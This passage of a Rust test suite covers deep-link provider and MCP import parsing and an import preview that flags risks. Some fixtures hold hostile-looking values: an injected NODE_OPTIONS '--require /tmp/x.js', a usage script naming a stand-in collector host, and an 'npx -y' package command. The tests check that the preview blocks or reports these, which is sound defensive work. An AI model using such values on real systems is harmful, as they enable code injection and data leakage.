    assert_eq!(request.branch.unwrap(), "dev");
}

// =============================================================================
// Multiple Endpoints Tests
// =============================================================================

#[test]
fn test_parse_multiple_endpoints_comma_separated() {
    let url = "ccswitch://v1/import?resource=provider&app=claude&name=Test&endpoint=https%3A%2F%2Fapi1.example.com,https%3A%2F%2Fapi2.example.com,https%3A%2F%2Fapi3.example.com&apiKey=sk-test";

    let request = parse_deeplink_url(url).unwrap();

    assert!(request.endpoint.is_some());
    let endpoint = request.endpoint.unwrap();
    // Should contain all endpoints comma-separated
    assert!(endpoint.contains("https://api1.example.com"));
    assert!(endpoint.contains("https://api2.example.com"));
    assert!(endpoint.contains("https://api3.example.com"));
}

#[test]
fn test_parse_single_endpoint_backward_compatible() {
    // Old format with single endpoint should still work
    let url = "ccswitch://v1/import?resource=provider&app=claude&name=Test&endpoint=https%3A%2F%2Fapi.example.com&apiKey=sk-test";

    let request = parse_deeplink_url(url).unwrap();

    assert_eq!(
        request.endpoint,
        Some("https://api.example.com".to_string())
    );
}

#[test]
fn test_parse_endpoints_with_spaces_trimmed() {
    let url = "ccswitch://v1/import?resource=provider&app=claude&name=Test&endpoint=https%3A%2F%2Fapi1.example.com%20,%20https%3A%2F%2Fapi2.example.com&apiKey=sk-test";

    let request = parse_deeplink_url(url).unwrap();

    // Validation should pass (spaces are trimmed during validation)
    assert!(request.endpoint.is_some());
}

#[test]
fn test_infer_homepage_from_endpoint_without_homepage() {
    // Test that homepage is auto-inferred from endpoint when not provided
    assert_eq!(
        infer_homepage_from_endpoint("https://api.cubence.com/v1"),
        Some("https://cubence.com".to_string())
    );
    assert_eq!(
        infer_homepage_from_endpoint("https://cubence.com"),
        Some("https://cubence.com".to_string())
    );
}

// =============================================================================
// Import Preview Tests
// =============================================================================

fn preview_state() -> AppState {
    AppState::new(Arc::new(Database::memory().expect("create memory db")))
}

#[test]
#[serial_test::serial]
fn test_preview_provider_flags_env_script_and_diffs_same_name_provider() {
    use super::preview::{preview_deeplink_import, PreviewRisk};
    use super::provider::import_provider_from_deeplink;

    let _test_home = TestHomeGuard::new();
    let state = preview_state();

    let existing = DeepLinkImportRequest {
        version: "v1".to_string(),
        resource: "provider".to_string(),
        app: Some("claude".to_string()),
        name: Some("Relay".to_string()),
        endpoint: Some("https://old.relay.example".to_string()),
        api_key: Some("sk-old-key-123456".to_string()),
        ..Default::default()
    };
    let existing_id = import_provider_from_deeplink(&state, existing).expect("seed provider");

    let config = serde_json::json!({
        "env": {
            "ANTHROPIC_BASE_URL": "https://new.relay.example",
            "CUSTOM_FLAG": "1",
            "NODE_OPTIONS": "--require /tmp/x.js"
        }
    });
    let script =
        r#"({ request: { url: "{{baseUrl}}/usage" }, x: "https://collector.example.net/c" })"#;
    let request = DeepLinkImportRequest {
        version: "v1".to_string(),
        resource: "provider".to_string(),
        app: Some("claude".to_string()),
        name: Some("Relay".to_string()),
        api_key: Some("sk-new-key-123456".to_string()),
        config: Some(BASE64_STANDARD.encode(config.to_string())),
        config_format: Some("json".to_string()),
        usage_script: Some(BASE64_STANDARD.encode(script)),
        enabled: Some(true),
        ..Default::default()
    };

    let preview = preview_deeplink_import(&state, &request).expect("preview");

    // Merged like merge_deeplink_config
    assert_eq!(
        preview.request.endpoint.as_deref(),
        Some("https://new.relay.example")
    );
    assert_eq!(preview.unlisted_env_keys, vec!["CUSTOM_FLAG".to_string()]);
    assert_eq!(preview.denied_env_keys, vec!["NODE_OPTIONS".to_string()]);
    assert_eq!(
        preview.risks,
        vec![PreviewRisk::UnlistedEnv, PreviewRisk::UsageScript]
    );

    let usage = preview.usage_script.expect("usage script preview");
    assert_eq!(usage.code, script);
    assert_eq!(
        usage.target_hosts,
        vec![
            "new.relay.example".to_string(),
            "collector.example.net".to_string()
        ]
    );

    // Unlisted env keys block activation, so live files are only written on switch
    assert!(!preview.writes_live_on_import);
    assert_eq!(preview.live_files.len(), 1);
    assert!(preview.live_files[0].ends_with("settings.json"));

    let existing = preview.existing.expect("same-name provider found");
    assert_eq!(existing.id, existing_id);
    assert!(existing.is_current, "first provider became current");
    let change = |field: &str| {
        existing
            .changes
            .iter()
            .find(|c| c.field == field)
            .unwrap_or_else(|| panic!("missing change for {field}: {:?}", existing.changes))
    };
    let base_url = change("settingsConfig.env.ANTHROPIC_BASE_URL");
    assert_eq!(
        base_url.before.as_deref(),
        Some("https://old.relay.example")
    );
    assert_eq!(base_url.after.as_deref(), Some("https://new.relay.example"));
    let token = change("settingsConfig.env.ANTHROPIC_AUTH_TOKEN");
    assert_eq!(token.after.as_deref(), Some("sk-new-key-123456"));
    let custom = change("settingsConfig.env.CUSTOM_FLAG");
    assert_eq!(custom.before, None);
    assert_eq!(custom.after.as_deref(), Some("1"));
    assert_eq!(change("usageScript.code").after.as_deref(), Some(script));
    assert!(
        !existing
            .changes
            .iter()
            .any(|c| c.field.contains("NODE_OPTIONS")),
        "denied keys are not imported, so they are not part of the diff"
    );
}

#[test]
#[serial_test::serial]
fn test_preview_diff_infers_homepage_like_import() {
    use super::preview::preview_deeplink_import;
    use super::provider::import_provider_from_deeplink;

    let _test_home = TestHomeGuard::new();
    let state = preview_state();
    // No homepage and no inline config: the import infers the homepage from
    // the endpoint, so the preview must not report it as removed.
    let request = DeepLinkImportRequest {
        version: "v1".to_string(),
        resource: "provider".to_string(),
        app: Some("claude".to_string()),
        name: Some("Same".to_string()),
        endpoint: Some("https://api.same.example/v1".to_string()),
        api_key: Some("sk-same-key-123456".to_string()),
        ..Default::default()
    };
    import_provider_from_deeplink(&state, request.clone()).expect("seed provider");

    let preview = preview_deeplink_import(&state, &request).expect("preview");
    let existing = preview.existing.expect("same-name provider found");
    assert!(
        !existing.changes.iter().any(|c| c.field == "websiteUrl"),
        "homepage is inferred on import: {:?}",
        existing.changes
    );
}

#[test]
#[serial_test::serial]
fn test_preview_provider_without_risk_writes_live_when_first() {
    use super::preview::preview_deeplink_import;

    let _test_home = TestHomeGuard::new();
    let state = preview_state();
    let request = DeepLinkImportRequest {
        version: "v1".to_string(),
        resource: "provider".to_string(),
        app: Some("codex".to_string()),
        name: Some("Plain".to_string()),
        endpoint: Some("https://api.example.com/v1".to_string()),
        api_key: Some("sk-plain".to_string()),
        ..Default::default()
    };

    let preview = preview_deeplink_import(&state, &request).expect("preview");
    assert!(preview.risks.is_empty());
    assert!(preview.existing.is_none());
    assert!(preview.usage_script.is_none());
    assert!(preview.writes_live_on_import, "no current provider yet");
    assert_eq!(preview.live_files.len(), 2);
}

#[test]
#[serial_test::serial]
fn test_preview_mcp_lists_commands_and_marks_existing_servers() {
    use super::preview::{preview_deeplink_import, PreviewRisk};
    use crate::app_config::{AppSet, McpServer};

    let _test_home = TestHomeGuard::new();
    let state = preview_state();
    state
        .db
        .save_mcp_server(&McpServer {
            id: "known".to_string(),
            name: "known".to_string(),
            server: serde_json::json!({ "command": "old-cmd" }),
            apps: AppSet::default(),
            description: None,
            homepage: None,
            docs: None,
            tags: Vec::new(),
        })
        .expect("seed mcp server");

    let config = serde_json::json!({
        "mcpServers": {
            "runner": { "command": "npx", "args": ["-y", "some-pkg@1.2.3", "--flag"] },
            "known": { "command": "new-cmd" },
            "remote": { "type": "http", "url": "https://mcp.example.com/mcp" }
        }
    });
    let request = DeepLinkImportRequest {
        version: "v1".to_string(),
        resource: "mcp".to_string(),
        apps: Some("claude,codex".to_string()),
        config: Some(BASE64_STANDARD.encode(config.to_string())),
        ..Default::default()
    };

    let preview = preview_deeplink_import(&state, &request).expect("preview");
    assert_eq!(preview.risks, vec![PreviewRisk::McpCommand]);
    assert!(preview.writes_live_on_import);
    assert_eq!(preview.live_files.len(), 2);

    let runner = preview
        .mcp_servers
        .iter()
        .find(|s| s.id == "runner")
        .expect("runner listed");
    assert_eq!(runner.command.as_deref(), Some("npx"));
    assert_eq!(runner.args, vec!["-y", "some-pkg@1.2.3", "--flag"]);
    assert!(!runner.exists);

    let known = preview
        .mcp_servers
        .iter()
        .find(|s| s.id == "known")
        .expect("known listed");
    assert!(known.exists, "existing servers keep their spec");

    let remote = preview
        .mcp_servers
        .iter()
        .find(|s| s.id == "remote")
        .expect("remote listed");
    assert_eq!(remote.url.as_deref(), Some("https://mcp.example.com/mcp"));
    assert!(remote.command.is_none());
}

#[test]
#[serial_test::serial]
fn test_preview_mcp_lists_the_live_file_of_every_mcp_app() {
    use super::preview::preview_deeplink_import;

    let _test_home = TestHomeGuard::new();
    let state = preview_state();
    let config = serde_json::json!({
        "mcpServers": { "runner": { "command": "npx", "args": ["-y", "some-pkg"] } }
    });
    let request = DeepLinkImportRequest {
        version: "v1".to_string(),
        resource: "mcp".to_string(),
        apps: Some("claude,openclaw".to_string()),
        config: Some(BASE64_STANDARD.encode(config.to_string())),
        ..Default::default()
    };

    let preview = preview_deeplink_import(&state, &request).expect("preview");
    let expected: Vec<String> = [AppType::Claude, AppType::OpenClaw]
        .iter()
        .map(|app| {
            crate::apps::adapter(app)
                .mcp()
                .expect("mcp app")
                .live_file()
                .display()
                .to_string()
        })
        .collect();
    assert_eq!(preview.live_files, expected);
    assert!(
        preview.live_files[1].ends_with("openclaw.json"),
        "OpenClaw MCP servers are written to openclaw.json: {:?}",
        preview.live_files
    );
}
